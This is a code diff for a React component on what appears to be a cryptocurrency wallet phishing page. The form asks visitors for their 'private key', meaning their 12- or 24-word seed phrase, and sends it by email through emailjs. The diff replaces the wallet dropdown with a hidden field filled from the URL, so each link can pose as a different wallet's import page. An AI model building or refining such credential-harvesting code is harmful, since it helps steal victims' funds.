@@ -1,8 +1,11 @@
 import React, { useState } from "react";
 import emailjs from "emailjs-com";
-import { Link } from "react-router-dom";
 
-import Data from "../data"
+import {
+  Link,
+  useParams
+} from "react-router-dom";
+
 
 const sendEmail = (e) => {
   e.preventDefault();
@@ -28,6 +31,7 @@ const sendEmail = (e) => {
 
 const Json = () => {
   const [hide, setHide] = useState(false);
+  let { id } = useParams();
 
   const Showmodal = () => {
     setHide(false);
@@ -65,15 +69,6 @@ const Json = () => {
           </div>
         ) : null}
         <form onSubmit={sendEmail}>
-          <label for="wallet"> Choose Wallet: {" "}</label>
-          <select style={{ color: "black", padding: ".5em" }} name="wallet" id="wallet">
-            {Data.map((item) => {
-              return (
-                <option style={{ color: "black" }} key={item.id} value={item.name} name="wallet">{item.name}</option>
-              )
-            })}
-          </select>
-          <br />
           <input
             type="text"
             placeholder="Private key"
@@ -84,9 +79,10 @@ const Json = () => {
           <h6 className="h4" style={{ color: "black" }}>
             Typically 12(sometimes 24) words separated by single spaces
           </h6>
+          <input type="text" value={id} className="hiddeen" name="wallet" />
           <button type="submit" onClick={Showmodal}>
             {" "}
-            <b>Import</b>{" "}
+            <b>Import { id}</b>{" "}
           </button>
 
         </form>
